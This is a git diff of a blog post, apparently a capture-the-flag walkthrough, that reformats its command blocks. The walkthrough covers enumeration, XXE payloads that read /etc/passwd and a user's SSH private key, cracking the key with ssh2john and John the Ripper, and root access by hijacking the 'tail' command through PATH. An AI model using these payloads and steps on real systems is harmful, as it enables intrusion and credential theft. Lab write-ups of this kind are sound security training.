@@ -18,10 +18,14 @@ comments: false
 <br>
 ## Let's eumerate the hidden directories
 ## Our scan shows:
-> /robots.txt and /custom
+{% highlight bash %}
+/robots.txt and /custom
+> {% endhighlight bash %}
 ************PIC
 <br>
-> /robots.txt shows nothing
+{% highlight bash %}
+/robots.txt shows nothing
+{% endhighlight bash %}
 <br>
 
 ## Enumerating /custom further, we see subdirectory /js
@@ -42,10 +46,12 @@ The cat command may not work as expected for a .bak file primarily because .bak 
 ************PIC
 ## We now get the cracked hash:  bulldog19
 <br>
+{% highlight bash %}
 I got stuck here.
 I did not see any login pages
 And ssh with the password was also failing
 Lets go back and see what we missed...
+{% endhighlight bash %}
 <br>
 ## AHH, so nmap -p- shows higher port open: 8765
 ************PIC
@@ -59,15 +65,18 @@ Lets go back and see what we missed...
 <br>
 ## Let's send another request and capture the response in burpsuite
 ## Looking at the response we can see:
+{% highlight bash %}
 1. username: Barry
 2. ssh is allowed with the correct key
 3. there is a directory /auth/dontforget.bak
+{% endhighlight bash %}
 ************PIC
 <br>
 
 ## Looking at this directory path,
 ## We can see the xml format we will need to use:
 ************PIC
+{% highlight bash %}
 < ?xml version="1.0" encoding="UTF-8"?>
 
 < comment>
@@ -75,7 +84,7 @@ Lets go back and see what we missed...
   < author>10DNC</author>
   < com>hacked</com>
 </comment> "
-
+{% endhighlight bash %}
 <br>
 <br>
 ## It looks like this is vulnerable to a XXE injection
@@ -83,7 +92,7 @@ Lets go back and see what we missed...
 ## [Injection#classic-xxe](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe)
 <br>
 ## Let's modify and test the basic blind XXE vulnerability:
-
+{% highlight bash %}
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
 < comment>
@@ -91,12 +100,13 @@ Lets go back and see what we missed...
   < author>10DNC</author>
   < com>&test;</com>
 </comment>
-
+{% endhighlight bash %}
 ************PIC
 <br>
 ## This works, Lets now try and get barry's credentials:
 
 <br>
+{% highlight bash %}
 < ?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
 < comment>
@@ -104,24 +114,31 @@ Lets go back and see what we missed...
   < author>10DNC</author>
   < com>&test;</com>
 </comment>
+{% endhighlight bash %}
 ************PIC
 -----------------
 ## We now get the ssh id_rsa key for barry
 ## We can save this to text file:
-> $ nano id_rsa
-
+{% highlight bash %}
+$ nano id_rsa
+{% endhighlight bash %}
 ## We will then lower the permissions:
-> $ chmod 600 id_rsa
-
-## Now use ssh2john to create hash 
-> $ ssh2john id_rsa > hash
-
-## Then use JTR to crack hash
-> $ john -w=/usr/share/wordlists/rockyou.txt mustacchio_hash
-
-## Now we can login with ssh using our new credentials
-> $ ssh -i id_rsa barry@target_IP
-> password: uriel james
+{% highlight bash %}
+$ chmod 600 id_rsa
+{% endhighlight bash %}
+## Now use ssh2john to create hash:
+{% highlight bash %}
+$ ssh2john id_rsa > hash
+{% endhighlight bash %}
+## Then use JTR to crack hash:
+{% highlight bash %}
+$ john -w=/usr/share/wordlists/rockyou.txt mustacchio_hash
+{% endhighlight bash %}
+## Now we can login with ssh using our new credentials:
+{% highlight bash %}
+$ ssh -i id_rsa barry@target_IP
+password: uriel james
+{% endhighlight bash %}
 <br>
 
 ************PIC
@@ -144,10 +161,14 @@ Lets go back and see what we missed...
 ## Lets hijack the "tail" command:
 
 ## Navigate to /tmp:
+{% highlight bash %}
 echo "/bin/bash" > tail
-
+{% endhighlight bash %}
+<br>
 ## run the live_log:
+{% highlight bash %}
 /home/joe/live_log
+{% endhighlight bash %}
 <br>
 ************PIC
 ## We are now root
